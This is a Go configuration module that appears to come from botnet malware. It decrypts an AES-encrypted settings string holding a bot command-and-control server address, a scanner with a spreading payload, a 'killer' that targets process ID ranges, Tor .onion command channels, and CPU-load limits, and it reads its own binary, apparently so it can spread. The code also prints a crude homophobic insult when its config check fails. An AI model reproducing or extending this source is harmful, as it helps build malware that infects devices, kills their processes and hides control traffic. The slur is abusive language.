package config

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
)

// CONFIG

/*


1 - server ip   :: string
2 - server port :: string
3 - scanner     :: bool
4 - num cpu (scanner) :: string
5 - max cpu load      :: string
6 - debug            :: bool
7 - killer min|max pid (if max=-1 no limit) :: string
8 - killer enabled :: bool
9 - payload       :: string

10 - tor server url (.onion) :: string
11 - tor server port :: string
12 - tor enabled :: bool


\\ - separator
*/

var (
	CONFIG = ""
)

// DO NOT CHANGE
var (
	TOR_SERVER string
	TOR_PORT   string

	TOR_ENABLED bool

	BOT_SERVER string
	BOT_PORT   string

	SCANNER_ENABLED     bool
	SCANNER_PAYLOAD     string
	SCANNER_MIN_NUM_CPU int

	MAX_CPU_VALUE int

	DEBUG bool

	BINARY_FILE []byte

	KILLER_ENABLED bool

	MIN_KILLER_PID int
	MAX_KILLER_PID int

	DISABLE_REAL_BOT_SERVER bool
)

func Config() {

	key := []byte{}

	dec, err := hex.DecodeString(CONFIG)
	if err != nil {
		os.Exit(0)
	}

	decrypted := Decrypt(key, string(dec))
	if decrypted == "" {
		os.Exit(0)
	}

	res := strings.Split(decrypted, "\\\\")

	if len(res) < 8 {
		println("fuck u stupid gay")
		os.Exit(0)
	}

	BOT_SERVER = res[0]
	BOT_PORT = res[1]

	if BOT_SERVER == "disable" && BOT_PORT == "disable" {
		DISABLE_REAL_BOT_SERVER = true
	}

	SCANNER_ENABLED, _ = strconv.ParseBool(res[2])

	SCANNER_MIN_NUM_CPU, _ = strconv.Atoi(res[3])

	MAX_CPU_VALUE, _ = strconv.Atoi(res[4])

	DEBUG, _ = strconv.ParseBool(res[5])

	MIN_KILLER_PID, _ = strconv.Atoi(strings.Split(res[6], "|")[0])

	maxkiller, _ := strconv.Atoi(strings.Split(res[6], "|")[1])

	if maxkiller == -1 {
		MAX_KILLER_PID = 1 << 30
	}

	KILLER_ENABLED, _ = strconv.ParseBool(res[7])

	SCANNER_PAYLOAD = res[8]
	TOR_SERVER = res[9]
	TOR_PORT = res[10]

	TOR_ENABLED, _ = strconv.ParseBool(res[11])

	BINARY_FILE, _ = os.ReadFile(os.Args[0])

}

func Encrypt(key []byte, plain string) string {
	byteMsg := []byte(plain)
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	cipherText := make([]byte, aes.BlockSize+len(byteMsg))
	iv := cipherText[:aes.BlockSize]
	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
		return ""
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(cipherText[aes.BlockSize:], byteMsg)

	return base64.StdEncoding.EncodeToString(cipherText)
}

func Decrypt(key []byte, plain string) string {
	cipherText, err := base64.StdEncoding.DecodeString(plain)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	if len(cipherText) < aes.BlockSize {
		fmt.Println(err)
		return ""
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText)
}
